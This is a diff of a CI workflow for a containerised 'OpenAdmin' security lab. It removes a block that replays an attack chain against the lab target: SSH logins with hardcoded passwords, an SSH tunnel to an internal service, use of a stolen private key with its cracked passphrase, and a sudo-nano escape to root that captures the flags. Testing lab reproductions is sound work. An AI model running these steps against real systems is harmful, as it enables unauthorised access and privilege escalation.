@@ -122,39 +122,6 @@ jobs:
             -e EXPECTED_ROOT_FLAG="$ROOT_FLAG" \
             ttp-openadmin-attacker:ci python3 /tests/attack_path.py
 
-          docker run --rm --network "$network" \
-            -v "$PWD/labs/openadmin/tests:/tests:ro" \
-            -e EXPECTED_USER_FLAG="$USER_FLAG" \
-            -e EXPECTED_ROOT_FLAG="$ROOT_FLAG" \
-            ttp-openadmin-attacker:ci bash -lc '
-              set -euo pipefail
-              sshpass -p "n1nj4W4rri0R!" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null jimmy@openadmin-target "id -un" | grep -Fx jimmy
-
-              sshpass -p "n1nj4W4rri0R!" ssh -N -L 52846:127.0.0.1:52846 \
-                -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null jimmy@openadmin-target &
-              tunnel=$!
-              trap "kill $tunnel 2>/dev/null || true" EXIT
-              for attempt in $(seq 1 30); do
-                python3 -c "import socket; s=socket.socket(); s.settimeout(1); s.connect((\"127.0.0.1\",52846)); s.close()" && break || sleep 1
-              done
-              python3 /tests/internal_key.py
-
-              sshpass -P "Enter passphrase for key" -p bloodninjas ssh \
-                -i /tmp/joanna_id_rsa -o StrictHostKeyChecking=no \
-                -o UserKnownHostsFile=/dev/null joanna@openadmin-target \
-                "id -un; cat /home/joanna/user.txt" > /tmp/joanna-user-proof
-              grep -Fx "joanna" /tmp/joanna-user-proof
-              grep -Fx "$EXPECTED_USER_FLAG" /tmp/joanna-user-proof
-
-              expect /tests/nano-root.exp || echo "Nano closed the SSH channel; validating independent root proofs"
-              root_proof=$(sshpass -P "Enter passphrase for key" -p bloodninjas ssh \
-                -i /tmp/joanna_id_rsa -o StrictHostKeyChecking=no \
-                -o UserKnownHostsFile=/dev/null joanna@openadmin-target \
-                "cat /tmp/openadmin-root-proof; cat /tmp/openadmin-root-flag-proof")
-              printf "%s\\n" "$root_proof" | grep -F "uid=0(root)"
-              printf "%s\\n" "$root_proof" | grep -Fx "$EXPECTED_ROOT_FLAG"
-            '
-
           docker stats --no-stream "$target" --format "OpenAdmin memory={{.MemUsage}} pids={{.PIDs}}"
           echo "PASS: one fresh instance completed ONA xajax RCE -> Jimmy -> SSH tunnel -> Joanna -> sudo nano UID 0 -> exact User/Root Flags"
 
